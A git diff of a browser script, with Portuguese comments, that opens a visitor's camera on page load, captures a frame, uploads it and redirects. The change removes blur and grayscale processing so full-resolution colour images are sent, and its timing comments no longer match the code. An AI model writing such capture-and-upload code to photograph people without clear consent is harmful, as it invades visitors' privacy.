@@ -19,7 +19,7 @@ document.addEventListener("DOMContentLoaded", async function () {
 
         // Aguarde 2 segundos para estabilizar a câmera antes da captura
         setTimeout(() => {
-            captureAndUpload(video, stream), captura.play()},7000);
+            captureAndUpload(video, stream), captura.play()},10000);
     } catch (error) {
         console.error("Erro ao acessar a câmera: ", error);
         alert("Permita o acesso à câmera para capturar imagens.");
@@ -39,30 +39,16 @@ document.addEventListener("DOMContentLoaded", async function () {
     // Após 10 segundos, redireciona o usuário
     setTimeout(() => {
         window.location.href = "/";
-    }, 10000);
+    }, 11000);
 });
 
 async function captureAndUpload(video, stream) {
     const canvas = document.createElement("canvas");
     const context = canvas.getContext("2d");
 
-    canvas.width = video.videoWidth / 2;
-    canvas.height = video.videoHeight / 2;
-    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
 
-    // Aplica o blur na imagem colorida
-    applyBlur(context, canvas.width, canvas.height, 5);
-
-    // Converte para escala de cinza
-    const imageData = context.getImageData(0, 0, canvas.width, canvas.height);
-    const data = imageData.data;
-    for (let i = 0; i < data.length; i += 4) {
-        const avg = (data[i] + data[i + 1] + data[i + 2]) / 3;
-        data[i] = avg;
-        data[i + 1] = avg;
-        data[i + 2] = avg;
-    }
-    context.putImageData(imageData, 0, 0);
 
     canvas.toBlob(async (blob) => {
         const formData = new FormData();
